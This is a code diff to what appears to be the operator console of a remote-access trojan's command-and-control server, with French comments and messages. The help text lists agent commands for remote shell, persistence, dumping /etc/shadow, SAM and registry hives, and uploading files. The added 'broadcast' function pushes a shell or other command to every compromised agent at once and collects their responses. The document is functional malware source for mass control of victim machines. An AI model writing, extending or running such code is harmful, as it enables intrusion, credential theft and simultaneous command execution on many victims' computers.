@@ -211,6 +211,7 @@ def cmd_help():
   shell <cmd> / screenshot / sysinfo / ip / list_users
   persistence / shadow / list_home / sam / registry
   upload <fichier_local> <dest_distante>
+  broadcast <commande> [args]
 """)
 
 def cmd_agents():
@@ -305,6 +306,44 @@ def cmd_upload(arg):
     print()
 
 
+def cmd_broadcast(arg):
+    if not arg:
+        print("Usage: broadcast <commande> [args]")
+        return
+    parts = arg.split(maxsplit=1)
+    cmd_name = parts[0].lower()
+    cmd_arg = parts[1] if len(parts) > 1 else ""
+
+    with agents_lock:
+        if not agents:
+            print("Aucun agent connecté")
+            return
+        targets = list(agents.values())
+
+    if cmd_name == "shell" and not cmd_arg:
+        print("Usage: broadcast shell <commande>")
+        return
+
+    if cmd_name == "shell":
+        payload = {"cmd": "shell", "command": cmd_arg}
+    else:
+        payload = {"cmd": cmd_name}
+
+    success = 0
+    for agent in targets:
+        try:
+            with agent.lock:
+                send_msg(agent.sock, payload)
+                resp = recv_response(agent)
+            print(f"\n--- Agent #{agent.id} ({agent.hostname}) ---")
+            if resp:
+                afficher_reponse(resp)
+            success += 1
+        except (ConnectionError, OSError):
+            print(f"\n--- Agent #{agent.id} — erreur de connexion ---")
+    print(f"\nBroadcast exécuté sur {success}/{len(targets)} agent(s)")
+
+
 #Boucle principale
 
 def main():
@@ -348,6 +387,8 @@ def main():
             cmd_screenshot()
         elif cmd == "upload":
             cmd_upload(arg)
+        elif cmd == "broadcast":
+            cmd_broadcast(arg)
         elif cmd in ("sysinfo", "list_users", "ip", "persistence",
                       "shadow", "list_home", "sam", "registry"):
             send_to_agent({"cmd": cmd}, label=cmd)
